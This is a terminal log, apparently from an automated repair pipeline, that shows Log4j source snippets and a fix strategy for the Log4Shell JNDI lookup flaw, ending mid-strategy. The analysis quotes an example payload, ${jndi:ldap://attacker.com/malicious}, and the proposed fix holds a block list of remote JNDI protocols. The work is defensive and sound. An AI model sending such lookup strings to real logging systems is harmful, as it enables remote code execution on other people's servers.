[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.pattern;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import org.apache.logging.log4j.core.config.Configuration;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.message.Message;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.message.MultiformatMessage;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * Returns the event's rendered message in a StringBuilder.[0m                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"MessagePatternConverter"[0m[39m, category = [0m[32m"Converter"[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:@[0m[1;35mConverterKeys[0m[1;39m([0m[1;39m{[0m[32m"m"[0m[39m, [0m[32m"msg"[0m[39m, [0m[32m"message"[0m[39m [0m[1;39m}[0m[1;39m)[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:public final class MessagePatternConverter extends LogEventPatternConverter [0m[1;39m{[0m    [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:    private final String[0m[1;39m[[0m[1;39m][0m[39m formats;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    private final Configuration config;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Private constructor.[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param options options, may be null.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    private [0m[1;35mMessagePatternConverter[0m[1;39m([0m[39mfinal Configuration config, final String[0m[1;39m[[0m[1;39m][0m[39m [0m  [2m                [0m
[2;36m                    [0m         [39moptions[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:        [0m[1;35msuper[0m[1;39m([0m[32m"Message"[0m[39m, [0m[32m"message"[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:        formats = options;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        this.config = config;[0m                                                    [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Obtains an instance of pattern converter.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param config The Configuration.[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @param options options, may be null.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     * @return instance of pattern converter.[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public static MessagePatternConverter [0m[1;35mnewInstance[0m[1;39m([0m[39mfinal Configuration [0m       [2m                [0m
[2;36m                    [0m         [39mconfig, final String[0m[1;39m[[0m[1;39m][0m[39m options[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        return new [0m[1;35mMessagePatternConverter[0m[1;39m([0m[39mconfig, options[0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:     * [0m[1;39m{[0m[39m@inheritDoc[0m[1;39m}[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    public void [0m[1;35mformat[0m[1;39m([0m[39mfinal LogEvent event, final StringBuilder toAppendTo[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:        final Message msg = [0m[1;35mevent.getMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        if [0m[1;39m([0m[39mmsg != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:            String result;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:            if [0m[1;39m([0m[39mmsg instanceof MultiformatMessage[0m[1;39m)[0m[39m [0m[1;39m{[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:                result = [0m[1;39m([0m[1;39m([0m[39mMultiformatMessage[0m[1;39m)[0m[39m [0m                                  [2m                [0m
[2;36m                    [0m         [39mmsg[0m[1;39m)[0m[1;35m.getFormattedMessage[0m[1;39m([0m[39mformats[0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:                result = [0m[1;35mmsg.getFormattedMessage[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:            if [0m[1;39m([0m[39mresult != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[39mconfig != null && [0m[1;35mresult.contains[0m[1;39m([0m[32m"$[0m[32m{[0m[32m"[0m[1;39m)[0m[39m ?[0m      [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:                    [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39mevent, result[0m[1;39m)[0m[39m : result[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:            [0m[1;39m}[0m[39m else [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:                [0m[1;35mtoAppendTo.append[0m[1;39m([0m[32m"null"[0m[1;39m)[0m[39m;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:62[0m[39m-[0m[1;36m67[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:99[0m[39m-[0m[1;36m124[0m    [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                    [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:        if [0m[1;39m([0m[39mvar == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:        final int prefixPos = [0m[1;35mvar.indexOf[0m[1;39m([0m[39mPREFIX_SEPARATOR[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:        if [0m[1;39m([0m[39mprefixPos >= [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:            final String prefix = [0m[1;35mvar.substring[0m[1;39m([0m[1;36m0[0m[39m, prefixPos[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            final String name = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:            final StrLookup lookup = [0m[1;35mlookups.get[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:            String value = null;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:            if [0m[1;39m([0m[39mlookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:                value = event == null ? [0m[1;35mlookup.lookup[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : [0m                  [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mevent, name[0m[1;39m)[0m[39m;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            if [0m[1;39m([0m[39mvalue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:                return value;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:            var = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        if [0m[1;39m([0m[39mdefaultLookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:            return event == null ? [0m[1;35mdefaultLookup.lookup[0m[1;39m([0m[39mvar[0m[1;39m)[0m[39m : [0m                 [2m                [0m
[2;36m                    [0m         [1;35mdefaultLookup.lookup[0m[1;39m([0m[39mevent, var[0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m123[0m[39m:        return null;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m124[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/selector/JNDIContextSelector.jav[0m[1;92ma:[0m [2m                [0m
[2;36m                    [0m         [1;92m110[0m[39m-[0m[1;36m122[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:        String loggingContextName = null;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:        try [0m[1;39m{[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:            final Context ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            loggingContextName = [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mlookup[0m[1;39m([0m[39mctx, [0m                          [2m                [0m
[2;36m                    [0m         [39mConstants.JNDI_CONTEXT_NAME[0m[1;39m)[0m[39m;[0m                                                       [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal NamingException ne[0m[1;39m)[0m[39m [0m[1;39m{[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to lookup "[0m[39m + Constants.JNDI_CONTEXT_NAME, [0m    [2m                [0m
[2;36m                    [0m         [39mne[0m[1;39m)[0m[39m;[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        return loggingContextName == null ? CONTEXT : [0m                          [2m                [0m
[2;36m                    [0m         [1;35mlocateContext[0m[1;39m([0m[39mloggingContextName, configLocation[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m122[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/helpers/Constants.jav[0m[1;92ma:38[0m[39m-[0m[1;36m42[0m       [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * JNDI context name string literal.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    public static final String JNDI_CONTEXT_NAME = [0m                              [2m                [0m
[2;36m                    [0m         [32m"java:comp/env/log4j/context-name"[0m[39m;[0m                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode_snippets[0m[39m>[0m                                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Fix Strategy[0m                                                                     [2m                [0m
[2;36m                    [0m         [39m<fix_strategy>[0m                                                                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Comprehensive Analysis[0m                                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe compilation error occurs because the previous patch attempted to make [0m          [2m                [0m
[2;36m                    [0m         [39m`ENABLE_JNDI` a final variable while keeping the `[0m[1;35msetEnableJndi[0m[1;39m([0m[1;39m)[0m[39m` method that [0m     [2m                [0m
[2;36m                    [0m         [39mtries to reassign it. The original code at line [0m[1;36m81[0m[39m-[0m[1;36m83[0m[39m contains a setter method [0m     [2m                [0m
[2;36m                    [0m         [39mthat's incompatible with a final variable.[0m                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mKey insights from the code analysis:[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Root Cause of Compilation Error**: The setter method `[0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean[0m[1;39m)[0m[39m` [0m [2m                [0m
[2;36m                    [0m         [39mat lines [0m[1;36m81[0m[39m-[0m[1;36m83[0m[39m attempts to assign to `ENABLE_JNDI`, which the patch made final.[0m     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Security Vulnerability**: JndiLookup performs JNDI lookups without protocol [0m   [2m                [0m
[2;36m                    [0m         [39mvalidation, allowing remote code execution through expressions like [0m                [2m                [0m
[2;36m                    [0m         [39m`$[0m[1;39m{[0m[39mjndi:ldap:[0m[35m/[0m[35m/attacker.com/[0m[95mmalicious[0m[1;39m}[0m[39m`.[0m                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Legitimate JNDI Usage**: The codebase has legitimate JNDI usage [0m               [2m                [0m
[2;36m                    [0m         [1;39m([0m[39mJNDIContextSelector, AbstractJMSManager[0m[1;39m)[0m[39m that uses safe [0m[32m"java:"[0m[39m protocol for local[0m [2m                [0m
[2;36m                    [0m         [39mcontexts. These must not be broken.[0m                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Attack Vector**: The vulnerability path is: User log message → [0m                [2m                [0m
[2;36m                    [0m         [1;35mMessagePatternConverter.format[0m[1;39m([0m[1;39m)[0m[39m → [0m[1;35mconfig.getSubst[0m[1;39m([0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[1;39m)[0m[39m → [0m                   [2m                [0m
[2;36m                    [0m         [1;35mInterpolator.lookup[0m[1;39m([0m[1;39m)[0m[39m → [0m[1;35mJndiLookup.lookup[0m[1;39m([0m[1;39m)[0m[39m → [0m                                      [2m                [0m
[2;36m                    [0m         [1;35mInitialContext.lookup[0m[1;39m([0m[39mattacker-controlled URL[0m[1;39m)[0m[39m.[0m                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Plugin Name Clarification**: The @Plugin name should remain [0m                   [2m                [0m
[2;36m                    [0m         [32m"MessagePatternConverter"[0m[39m. The [0m[32m"m"[0m[39m is already defined in @ConverterKeys and [0m        [2m                [0m
[2;36m                    [0m         [39mchanging the plugin name would break plugin discovery.[0m                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Fix Strategy[0m                                                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### [0m[1;36m1[0m[39m. **Fix JndiLookup.java** [0m[1;39m([0m[39mPrimary Defense[0m[1;39m)[0m                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Step [0m[1;36m1.1[0m[39m**: Keep `ENABLE_JNDI` as a non-final static variable to maintain [0m        [2m                [0m
[2;36m                    [0m         [39mbackward compatibility with the setter method, but initialize it securely:[0m          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m Add imports[0m                                                                      [2m                [0m
[2;36m                    [0m         [39mimport org.apache.logging.log4j.Logger;[0m                                             [2m                [0m
[2;36m                    [0m         [39mimport org.apache.logging.log4j.status.StatusLogger;[0m                                [2m                [0m
[2;36m                    [0m         [39mimport org.apache.logging.log4j.util.PropertiesUtil;[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m Declare logger[0m                                                                   [2m                [0m
[2;36m                    [0m         [39mprivate static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m                      [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m Make ENABLE_JNDI non-final but initialize from configuration[0m                     [2m                [0m
[2;36m                    [0m         [39mprivate static boolean ENABLE_JNDI;[0m                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mstatic [0m[1;39m{[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m    ENABLE_JNDI = [0m                                                                  [2m                [0m
[2;36m                    [0m         [1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m[1;35m.getBooleanProperty[0m[1;39m([0m[32m"log4j2.enableJndiLookup"[0m[39m, [0m       [2m                [0m
[2;36m                    [0m         [39mfalse[0m[1;39m)[0m[39m;[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m    if [0m[1;39m([0m[39mENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                              [2m                [0m
[2;36m                    [0m         [39m        [0m[1;35mLOGGER.warn[0m[1;39m([0m[32m"JNDI lookup is enabled. This can pose a security risk. Set [0m    [2m                [0m
[2;36m                    [0m         [32mlog4j2.[0m[32menableJndiLookup[0m[32m=[0m[32mfalse[0m[32m to disable."[0m[1;39m)[0m[39m;[0m                                        [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;39m}[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Step [0m[1;36m1.2[0m[39m**: Add protocol validation method before the `convertJndiName` method:[0m   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[39m**[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m * Validates that the JNDI name uses only allowed protocols [0m[1;39m([0m[39mlocal java: scheme[0m[1;39m)[0m[39m.[0m   [2m                [0m
[2;36m                    [0m         [39m * Rejects remote protocols like ldap:[0m[35m/[0m[35m/[0m[39m, ldaps:[0m[35m/[0m[35m/[0m[39m, rmi:[0m[35m/[0m[35m/[0m[39m, dns:[0m[35m/[0m[35m/[0m[39m, iiop:[0m[35m/[0m[35m/[0m[39m, [0m       [2m                [0m
[2;36m                    [0m         [39mcorba:[0m[35m/[0m[35m/[0m[95m.[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m * [0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m * @param jndiName The JNDI name to validate[0m                                        [2m                [0m
[2;36m                    [0m         [39m * @return true if the protocol is allowed, false otherwise[0m                         [2m                [0m
[2;36m                    [0m         [39m *[0m[35m/[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39mprivate boolean [0m[1;35misAllowedJndiProtocol[0m[1;39m([0m[39mfinal String jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                      [2m                [0m
[2;36m                    [0m         [39m    if [0m[1;39m([0m[39mjndiName == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                         [2m                [0m
[2;36m                    [0m         [39m        return false;[0m                                                               [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m    final String lowerName = [0m[1;35mjndiName.toLowerCase[0m[1;39m([0m[1;39m)[0m[39m;[0m                                [2m                [0m
[2;36m                    [0m         [39m    [0m                                                                                [2m                [0m
[2;36m                    [0m         [39m    [0m[35m/[0m[35m/[0m[39m Check for dangerous protocols with :[0m[35m/[0m[35m/[0m[39m separator[0m                             [2m                [0m
[2;36m                    [0m         [39m    if [0m[1;39m([0m[1;35mlowerName.contains[0m[1;39m([0m[32m"://"[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [39m        final int protoIndex = [0m[1;35mlowerName.indexOf[0m[1;39m([0m[32m"://"[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [39m        final String protocol = [0m[1;35mlowerName.substring[0m[1;39m([0m[1;36m0[0m[39m, protoIndex[0m[1;39m)[0m[39m;[0m                 [2m                [0m
[2;36m                    [0m         [39m        [0m                                                                            [2m                [0m
[2;36m                    [0m         [39m        [0m[35m/[0m[35m/[0m[39m Only allow java protocol for local JNDI contexts[0m                         [2m                [0m
[2;36m                    [0m         [39m        if [0m[1;39m([0m[39m![0m[1;35mprotocol.equals[0m[1;39m([0m[32m"java"[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                             [2m                [0m
[2;36m                    [0m         [39m            return false;[0m                                                           [2m                [0m
[2;36m                    [0m         [39m        [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m    [0m                                                                                [2m                [0m
[2;36m                    [0m         [39m    [0m[35m/[0m[35m/[0m[39m Also reject if it starts with known dangerous protocols without :[0m[35m/[0m[35m/[0m          [2m                [0m
[2;36m                    [0m         [39m    [0m[35m/[0m[35m/[0m[39m This catches cases like [0m[32m"ldap:..."[0m[39m without the double slash[0m                  [2m                [0m
[2;36m                    [0m         [39m    if [0m[1;39m([0m[1;35mlowerName.startsWith[0m[1;39m([0m[32m"ldap:"[0m[1;39m)[0m[39m || [0m[1;35mlowerName.startsWith[0m[1;39m([0m[32m"ldaps:"[0m[1;39m)[0m[39m ||[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[1;35mlowerName.startsWith[0m[1;39m([0m[32m"rmi:"[0m[1;39m)[0m[39m || [0m[1;35mlowerName.startsWith[0m[1;39m([0m[32m"dns:"[0m[1;39m)[0m[39m ||[0m             [2m                [0m
[2;36m                    [0m         [39m        [0m[1;35mlowerName.startsWith[0m[1;39m([0m[32m"iiop:"[0m[1;39m)[0m[39m || [0m[1;35mlowerName.startsWith[0m[1;39m([0m[32m"corba:"[0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m          [2m                [0m
[2;36m                    [0m         [39m        return false;[0m                                                               [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m    return true;[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;39m}[0m                                                                                   [2m                [0m
